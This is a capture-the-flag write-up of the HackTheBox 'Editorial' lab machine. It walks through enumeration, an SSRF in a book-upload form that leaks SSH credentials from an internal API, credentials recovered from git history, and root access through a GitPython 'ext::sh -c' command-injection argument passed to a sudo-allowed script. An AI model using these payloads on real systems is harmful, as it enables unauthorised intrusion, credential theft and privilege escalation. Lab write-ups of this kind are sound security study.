---
title: HTB - Editorial
date: 2024-10-19 00:00:00 + 1000
categories: [Linux,Web App,CTF,HTB]
tags: [WebExploitation,SSRF, BurpSuite, GitPython]
comments: false
---

The Editorial machine was compromised by exploiting a Server-Side Request Forgery (SSRF) vulnerability in the website's upload functionality to find credentials and leverage an old git vulnerability. Initial access was gained via SSH using exposed credentials and escalated to root by exploiting the `gitpython` vulnerability via sudo access


## Common Enumeration 

### Nmap

I fired up `nmap` for a full port scan: `sudo nmap -p- -sC -sV -oA recon/allports 10.10.11.20 --open`. As always I throw in the `-sC` for default scripts and `-sV` for version detection and it found two open ports

- SSH - `22` 
- HTTP - `80`

```bash
$ sudo nmap -p- -sC -sV -oA recon/allports 10.10.11.20 --open
[sudo] password for ctf: 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-06-24 19:21 AEST
Nmap scan report for 10.10.11.20
Host is up (0.0064s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 0d:ed:b2:9c:e2:53:fb:d4:c8:c1:19:6e:75:80:d8:64 (ECDSA)
|_  256 0f:b9:a7:51:0e:00:d5:7b:5b:7c:5f:bf:2b:ed:53:a0 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://editorial.htb
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.20 seconds
```

The web server redirected to `http://editorial.htb/`, so I added that to my `/etc/hosts`
### Directory Brute Forcing and Fuzzing

Just two hits: `/upload` and `/about`. Not a goldmine. Next, I tried `ffuf` to see if there were any subdomains hiding out but sadly, nothing came up

```bash
$ gobuster dir -u http://editorial.htb/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-small-words.txt 
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://editorial.htb/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/raft-small-words.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/upload               (Status: 200) [Size: 7140]
/about                (Status: 200) [Size: 2939]
Progress: 43007 / 43008 (100.00%)
===============================================================
Finished
===============================================================

─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────

$ ffuf -u http://10.10.11.20 -H "Host: FUZZ.editorial.htb" -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt -fs 178

 :: Method           : GET
 :: URL              : http://10.10.11.20
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt
 :: Header           : Host: FUZZ.editorial.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 178
________________________________________________

:: Progress: [114441/114441] :: Job [1/1] :: 8000 req/sec :: Duration: [0:00:14] :: Errors: 0 ::
```

## Website - HTTP 80
### Browsing Website

Browsing the `http://editorial.htb/` beings up the homepage was nothing too special

![img](/assets/img/Editorial/1.webp)

Next, I poked around at `http://editorial.htb/upload`. It was a page that let you upload your book. Intriguing...

![img](/assets/img/Editorial/2.webp)

### /upload

So, it's pretty clear that `/upload` is where the action is?

![img](/assets/img/Editorial/3.webp)

Clicking "Preview" sent a request, I fired up Burp Suite to see what was going on under the hood

```bash
POST /upload-cover HTTP/1.1
Host: editorial.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: multipart/form-data; boundary=---------------------------29851459943648601552975765330
Content-Length: 342
Origin: http://editorial.htb
Connection: close
Referer: http://editorial.htb/upload
-----------------------------29851459943648601552975765330
Content-Disposition: form-data; name="bookurl"
-----------------------------29851459943648601552975765330
Content-Disposition: form-data; name="bookfile"; filename="hello.txt"
Content-Type: text/plain
Hello!
-----------------------------29851459943648601552975765330--
```

![img](/assets/img/Editorial/4.webp)

### Server-Side Request Forgery (SSRF)

This is where it gets interesting. I set up a listener with `nc -lvnp 1337` on my attacking machine and then I added my IP address and port to the upload request to see what would happen: `http://10.10.14.33:1337`

```bash
POST /upload-cover HTTP/1.1
Host: editorial.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: multipart/form-data; boundary=---------------------------201502267969488486022705567
Content-Length: 336
Origin: http://editorial.htb
Connection: close
Referer: http://editorial.htb/upload
-----------------------------201502267969488486022705567
Content-Disposition: form-data; name="bookurl"
http://10.10.14.33:1337
-----------------------------201502267969488486022705567
Content-Disposition: form-data; name="bookfile"; filename="hello.txt"
Content-Type: text/plain
Hello!
-----------------------------201502267969488486022705567--
```

![img](/assets/img/Editorial/5.webp)

BINGO! A connection! That's a clear sign of Server-Side Request Forgery (SSRF) vulnerability. The target was reaching out to my listener!

```bash
$ nc -lvnp 1337
listening on [any] 1337 ...
connect to [10.10.14.33] from (UNKNOWN) [10.10.11.20] 39440
GET / HTTP/1.1
Host: 10.10.14.33:1337
User-Agent: python-requests/2.25.1
Accept-Encoding: gzip, deflate
Accept: */*
Connection: keep-alive
```

Now, I could've thrown all 65535 ports at it, but why not be a little more strategic? I started with the usual suspects, and BAM! Port `5000` started talking, which is usually a good sign

![img](/assets/img/Editorial/6.webp)

#### SSH Credential

It coughed up 5 API endpoints. Interesting...

```bash
$ curl  http://editorial.htb/static/uploads/892ca72e-3c94-4bd4-8241-a57f58d05ac7 | jq
{ 
  "messages": [
    {
      "promotions": {
        "description": "Retrieve a list of all the promotions in our library.",
        "endpoint": "/api/latest/metadata/messages/promos",
        "methods": "GET"
      }
    },
    {
      "coupons": {                                                                                                                       
        "description": "Retrieve the list of coupons to use in our library.",
        "endpoint": "/api/latest/metadata/messages/coupons",
        "methods": "GET"
      }
    },
    {
      "new_authors": {
        "description": "Retrieve the welcome message sended to our new authors.",
        "endpoint": "/api/latest/metadata/messages/authors",
        "methods": "GET"
      }
    },
    {
      "platform_use": {                                                                                                                  
        "description": "Retrieve examples of how to use the platform.",
        "endpoint": "/api/latest/metadata/messages/how_to_use_platform",
        "methods": "GET"
      }
    }
  ],
  "version": [
    {
      "changelog": {
        "description": "Retrieve a list of all the versions and updates of the api.",
        "endpoint": "/api/latest/metadata/changelog",
        "methods": "GET"
      }
    },
    {
      "latest": {
        "description": "Retrieve the last version of api.",
        "endpoint": "/api/latest/metadata",
        "methods": "GET"
      }
    }
  ]
}
```

Then, digging a little further to `http://127.0.0.1:5000/api/latest/metadata/messages/authors` endpoint there was the ssh credential: `dev:dev080217_devAPI!@`

```bash
$ curl http://editorial.htb/static/uploads/9dc18526-9b01-452f-b796-4ca12fefa3cf | jq
{
  "template_mail_message": "Welcome to the team! We are thrilled to have you on board and can't wait to see the incredible content you'll bring to the table.\n\nYour login credentials for our internal forum and authors site are:\nUsername: dev\nPassword: dev080217_devAPI!@\nPlease be sure to change your password as soon as possible for security purposes.\n\nDon't hesitate to reach out if you have any questions or ideas - we're always here to support you.\n\nBest regards, Editorial Tiempo Arriba Team."
}
```
## Initial Access

I tried the credential, and I was in via SSH! `dev:dev080217_devAPI!@` and got the user flag - `user.txt`

```bash
c97634fc5...
```

Digging around, I found a directory called 'apps,' and inside, a `.git` directory. Always worth a peek!

```bash
dev@editorial:~/apps$ ls -la
total 12
drwxrwxr-x 3 dev dev 4096 Jun  5 14:36 .
drwxr-x--- 4 dev dev 4096 Jun 24 11:45 ..
drwxr-xr-x 8 dev dev 4096 Jun  5 14:36 .git
```

### Git Commit

Checking the `git log` I see `change(api): downgrading prod to dev` - now that's something that will catch my eye!

```bash
commit b73481bb823d2dfb49c44f4c1e6a7e11912ed8ae
Author: dev-carlos.valderrama <dev-carlos.valderrama@tiempoarriba.htb>
Date:   Sun Apr 30 20:55:08 2023 -0500

    change(api): downgrading prod to dev
    
    * To use development environment.

```

I looked into `git show b73481` and it showed that they swapped the prod credentials with the dev credentials we found earlier. The prod credentials were - Username: `prod` & Password: `080217_Producti0n_2023!@`. Sweet!

```bash
dev@editorial:~/apps/.git$ git show b73481
commit b73481bb823d2dfb49c44f4c1e6a7e11912ed8ae
Author: dev-carlos.valderrama <dev-carlos.valderrama@tiempoarriba.htb>
Date:   Sun Apr 30 20:55:08 2023 -0500

    change(api): downgrading prod to dev
    
    * To use development environment.

diff --git a/app_api/app.py b/app_api/app.py
index 61b786f..3373b14 100644
--- a/app_api/app.py
+++ b/app_api/app.py
@@ -64,7 +64,7 @@ def index():
 @app.route(api_route + '/authors/message', methods=['GET'])
 def api_mail_new_authors():
     return jsonify({
-        'template_mail_message': "Welcome to the team! We are thrilled to have you on board and can't wait to see the incredible content you'll bring to the table.\n\nYour login credentials for our internal forum and authors site are:\nUsername: prod\nPassword: 080217_Producti0n_2023!@\nPlease be sure to change your password as soon as possible for security purposes.\n\nDon't hesitate to reach out if you have any questions or ideas - we're always here to support you.\n\nBest regards, " + api_editorial_name + " Team."
+        'template_mail_message': "Welcome to the team! We are thrilled to have you on board and can't wait to see the incredible content you'll bring to the table.\n\nYour login credentials for our internal forum and authors site are:\nUsername: dev\nPassword: dev080217_devAPI!@\nPlease be sure to change your password as soon as possible for security purposes.\n\nDon't hesitate to reach out if you have any questions or ideas - we're always here to support you.\n\nBest regards, " + api_editorial_name + " Team."
     }) # TODO: replace dev credentials when checks pass
 
 # -------------------------------
```

## Privilege Escalation
### SSH as Prod

I tried to switch to prod with `su prod` and used those credentials and I am now prod

```bash
prod@editorial:/home/dev$ whoami
prod
```

Ran `sudo -l` and it showed that I could run a python script with root privileges. Score!

```bash
rod@editorial:/home/dev$ sudo -l
Matching Defaults entries for prod on editorial:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User prod may run the following commands on editorial:
    (root) /usr/bin/python3 /opt/internal_apps/clone_changes/clone_prod_change.py *
```

Taking a look at the `clone_prod_change.py` script. The script basically clones Git repos to a folder. I thought of that `gitpython` vulnerability I read about...

```python
#!/usr/bin/python3

import os
import sys
from git import Repo

os.chdir('/opt/internal_apps/clone_changes')

url_to_clone = sys.argv[1]

r = Repo.init('', bare=True)
r.clone_from(url_to_clone, 'new_changes', multi_options=["-c protocol.ext.allow=always"])
```

I checked the `pip list` and there it was: `GitPython 3.1.29`, which is vulnerable to - [SNYK-PYTHON-GITPYTHON](https://security.snyk.io/vuln/SNYK-PYTHON-GITPYTHON-3113858)

```bash
prod@editorial:/opt/internal_apps/clone_changes$ pip list | grep -i git
gitdb                 4.0.10
GitPython             3.1.29
```
## Root

Now, time for the big finale! I use the vulnerability in gitpython and the sudo access to escalate privileges to root. The root flag was in `/dev/shm/root`

```bash
prod@editorial:/opt/internal_apps/clone_changes$ sudo /usr/bin/python3 /opt/internal_apps/clone_changes/clone_prod_change.py 'ext::sh -c 
cat% /root/root.txt% >% /dev/shm/root'
```

root.txt

```text
32ee7006...
```